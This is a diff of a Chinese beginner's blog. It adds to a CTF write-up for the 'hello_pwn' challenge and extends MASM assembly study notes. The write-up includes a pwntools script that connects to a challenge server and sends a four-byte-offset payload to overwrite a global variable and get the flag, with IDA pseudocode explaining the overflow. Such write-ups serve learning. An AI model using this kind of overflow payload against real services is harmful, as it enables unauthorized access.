@@ -243,10 +243,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-12-18 18:54:01 / Modified: 20:41:10" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
+              <time title="Created: 2020-12-18 18:54:01" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-12-19 15:50:04" itemprop="dateModified" datetime="2020-12-19T15:50:04+08:00">2020-12-19</time>
+              </span>
 
           
 
@@ -277,7 +283,23 @@
 <p>写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
 <p>运行脚本，成功</p>
-<p>爷太菜了，爷滚去看汇编了</p>
+<p><strong>爷太菜了，爷滚去看汇编了</strong></p>
+<p><strong>······</strong></p>
+<p><strong>一目十行速成汇编，我胡汉三又回来了</strong></p>
+<p>附件扔IDA，找到main得到一个结构</p>
+<img src="/2020/12/18/AD-hello-pwn/1.png" class>
+<p>反汇编得到一段伪c代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  if ( dword_60106C &#x3D;&#x3D; 1853186401 )</span><br><span class="line">    sub_400686();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码里面有read函数，上网去找C语言read()函数的用法</p>
+<p>从文件中读取指定大小的字节函数read()</p>
+<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code><br>参数说明：<br>fd:   是文件描述符，对应0<br>buf:   为读出数据的缓冲区<br>count:  为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）<br>总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
+<p>返回值:<br>若读取失败则返回-1。<br>读取成功则返回实际读取到的字节数,有两种情况:<br> [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。<br> [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。<br>注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节’\0’才能组成一个字符串</p>
+<p>回到题目<br>第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。<br>将数据读到&amp;unk_601068（我猜）</p>
+<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了）<br><img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
+<p>双击sub_400686()，跳转到：<br><img src="/2020/12/18/AD-hello-pwn/5.png" class><br>芜湖起飞</p>
+<p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
+<p>现在我能读懂脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我们的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
+<p>没有人比我更懂速成</p>
 
       
     </div>
@@ -1005,7 +1027,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-19 00:22:12" itemprop="dateModified" datetime="2020-12-19T00:22:12+08:00">2020-12-19</time>
+                <time title="Modified: 2020-12-19 15:04:06" itemprop="dateModified" datetime="2020-12-19T15:04:06+08:00">2020-12-19</time>
               </span>
 
           
@@ -1050,7 +1072,7 @@
 </div>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">26			;十进制</span><br><span class="line">26d			;十进制</span><br><span class="line">11010011b	;二进制</span><br><span class="line">42q			;八进制</span><br><span class="line">42o			;八进制</span><br><span class="line">1Ah			;十六进制</span><br><span class="line">0A3h		;十六进制，以字母开头的十六进制数把必须加个0前置0，以防汇编器将其解释为标识符</span><br></pre></td></tr></table></figure>
 <hr>
-<h2 id="第一个masm程序"><a href="#第一个masm程序" class="headerlink" title="第一个masm程序"></a>第一个masm程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.386									伪指令，表示这是一个32位程序，能访问32位寄存器的地址</span><br><span class="line">.modle flat,stdcall	</span><br><span class="line">;选择程序的内存模式为（flat），并确定了子程序的调用规范（stdcall）（32位windows服务要求使用stdcall规范）</span><br><span class="line">.stack 4096								;STACK伪指令标识的程序区段定义了运行时堆栈，并设置了其大小，4096字节</span><br><span class="line">ExitProcess proto, dwexitcode:dword</span><br><span class="line">;这是一个函数原型的声明，声明ExitProcess函数（一个标准的windows服务）</span><br><span class="line">;原型包括：函数名、PROTO关键字、一个逗号、以及一个输入参数列表</span><br><span class="line">;ExitProcess的输入参数为dwexitcode</span><br><span class="line"></span><br><span class="line">.data					;此为数据区</span><br><span class="line">sum dword 999			;定义名为sum的变量,大小为32位，使用了关键字DWORD</span><br><span class="line"></span><br><span class="line">.code					;此为代码区</span><br><span class="line">main proc				;声明，标记了程序开始执行的地址</span><br><span class="line">	mov eax,8</span><br><span class="line">	mov ebx,8</span><br><span class="line">	add eax,ebx</span><br><span class="line">	inc eax</span><br><span class="line">	imul eax,sum,8</span><br><span class="line">comment !be太苣了!</span><br><span class="line">	invoke ExitProcess,0		</span><br><span class="line">	;调用Windows服务（也被成为函数）ExitProcess停止程序，并将控制权交还给操作系统。还有invoke也是伪指令</span><br><span class="line">main endp						;是主程序结束的标记</span><br><span class="line">end main						;end伪指令，标记汇编的最后一行，标识程序入口main</span><br></pre></td></tr></table></figure>
+<h2 id="第一个masm程序"><a href="#第一个masm程序" class="headerlink" title="第一个masm程序"></a>第一个masm程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.386									伪指令，表示这是一个32位程序，能访问32位寄存器的地址</span><br><span class="line">.modle flat,stdcall	</span><br><span class="line">;选择程序的内存模式为（flat），并确定了子程序的调用规范（stdcall）（32位windows服务要求使用stdcall规范）</span><br><span class="line">.stack 4096								;STACK伪指令标识的程序区段定义了运行时堆栈，并设置了其大小，4096字节</span><br><span class="line">ExitProcess proto, dwexitcode:dword</span><br><span class="line">;这是一个函数原型的声明，声明ExitProcess函数（一个标准的windows服务）</span><br><span class="line">;原型包括：函数名、PROTO关键字、一个逗号、以及一个输入参数列表</span><br><span class="line">;ExitProcess的输入参数为dwexitcode</span><br><span class="line"></span><br><span class="line">.data					;此为数据区</span><br><span class="line">sum dword 999			;定义名为sum的变量,大小为32位，使用了关键字DWORD</span><br><span class="line"></span><br><span class="line">.code					;此为代码区</span><br><span class="line">main proc				;声明，标记了程序开始执行的地址</span><br><span class="line">	mov eax,8</span><br><span class="line">	mov ebx,8</span><br><span class="line">	add eax,ebx</span><br><span class="line">	inc eax</span><br><span class="line">	imul eax,sum,8				;X86指令集不允许将变量直接与变量相加，但允许变量与寄存器相加</span><br><span class="line">comment !be太苣了!</span><br><span class="line">	invoke ExitProcess,0		</span><br><span class="line">	;调用Windows服务（也被成为函数）ExitProcess停止程序，并将控制权交还给操作系统。还有invoke也是伪指令</span><br><span class="line">main endp						;是主程序结束的标记</span><br><span class="line">end main						;end伪指令，标记汇编的最后一行，标识程序入口main</span><br></pre></td></tr></table></figure>
 <hr>
 <p><strong>保留字</strong>由计算机保留，<strong>标识符</strong>由程序员定义</p>
 <p><strong>伪指令</strong><br>伪指令是嵌入源代码中的命令，有汇编器识别和执行。伪指令不在运行时执行，但是可以定义变量、宏和子程序，为内存段分配名称等等。</p>
@@ -1067,6 +1089,97 @@
 <p>end标记一个程序的结束，并要引用入口</p>
 <h2 id="一个适合初学者的模板"><a href="#一个适合初学者的模板" class="headerlink" title="一个适合初学者的模板"></a>一个适合初学者的模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	;在这里声明变量</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">	;在这里编写自己的代码</span><br><span class="line">	INVOKEN ExitProcess,0</span><br><span class="line">main PROC</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>
 <p>汇编器生成包含机器语言的文件（目标文件object file），传递给链接器（linker）程序，从而生成可执行文件（exe）——在操作系统命令提示符下执行。</p>
+<h2 id="数据定义伪指令"><a href="#数据定义伪指令" class="headerlink" title="数据定义伪指令"></a>数据定义伪指令</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>伪指令</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BYTE</td>
+<td>8位无符号整数，B代表字节</td>
+</tr>
+<tr>
+<td>WORD</td>
+<td>16位无符号整数</td>
+</tr>
+<tr>
+<td>REAL4</td>
+<td>32位（4字节）IEEE短实数</td>
+</tr>
+<tr>
+<td>QWORD</td>
+<td>64位整数，Q代表四（字）</td>
+</tr>
+<tr>
+<td>DWORD</td>
+<td>32位整数，D代表双（字）</td>
+</tr>
+<tr>
+<td>DB/SBYTE</td>
+<td>8位整数</td>
+</tr>
+<tr>
+<td>DW/SWORD</td>
+<td>16位整数</td>
+</tr>
+<tr>
+<td>DD</td>
+<td>32位整数或实数</td>
+</tr>
+<tr>
+<td>DQ</td>
+<td>64位整数或实数</td>
+</tr>
+<tr>
+<td>DT/TBYTE</td>
+<td>定义80位（10字节）整数</td>
+</tr>
+<tr>
+<td>剩余遇到后补充</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>定义</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greeting1 \</span><br><span class="line">BYTE &quot;welcome,&quot;,0dh,0da</span><br><span class="line">BYTE &quot;Allow me.&quot;,0</span><br><span class="line">;可分行；“\”把两源代码行连接成一条语句；“0dh”“0da”换行；“0”空字节作为结束标记</span><br><span class="line">a DWORD 20 DUP(0)	;分配空间20字节，初始值为0</span><br></pre></td></tr></table></figure>
+<p><strong>将实数编码压缩为BCD编码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">a REAL8 1.5</span><br><span class="line">b TBYTE ?	;未初始化时减小编译程序大小</span><br><span class="line">.code</span><br><span class="line">fld a		;加载到浮点堆栈</span><br><span class="line">fbstp b		;向上舍入到2，压缩BCD码值</span><br></pre></td></tr></table></figure></p>
+<h2 id="一些符号"><a href="#一些符号" class="headerlink" title="一些符号"></a>一些符号</h2><p><strong>键盘定义</strong><br>键盘有对应的ASCII码，如Esc键的ASCII码为27<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov a,Esc_key </span><br></pre></td></tr></table></figure></p>
+<p><strong>计算数组和字符串大小</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list BYTE 10,20,30,404</span><br><span class="line">List &#x3D; ($ - list)</span><br></pre></td></tr></table></figure><br>从当前地址计数器（$）中减去list的偏移量<br>当计算元素数量的数组中包含的不是字节时，应用数组总字节数除以单个元素大小，一般来说单个元素为1字节，所以没有这步</p>
+<p><strong>等号、EQU、TEXTQU伪指令</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>伪指令</th>
+<th>跟着的</th>
+<th>注意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>EQU</td>
+<td>整数表达式，符号，&lt;文本&gt;</td>
+<td>不能重新定义</td>
+</tr>
+<tr>
+<td>TEXTEQU</td>
+<td>&lt;文本&gt;，%整数表达式，TEXTEQU</td>
+<td>可以套娃</td>
+</tr>
+<tr>
+<td>=</td>
+<td>整数表达式，</td>
+<td>可重新定义</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="64位编程"><a href="#64位编程" class="headerlink" title="64位编程"></a>64位编程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;省略了一堆东西</span><br><span class="line">ExitProcess PROTO		;PROTO不带参数</span><br><span class="line">.data</span><br><span class="line">	;定义变量</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">	;代码</span><br><span class="line">	mov ecx,0			;64位不带INVOKE，用mov，call结束程序</span><br><span class="line">	call ExitProcess</span><br><span class="line">main endp</span><br><span class="line">END						;未指定程序入口点</span><br></pre></td></tr></table></figure>
+<p>8ui哦九年</p>
 
       
     </div>
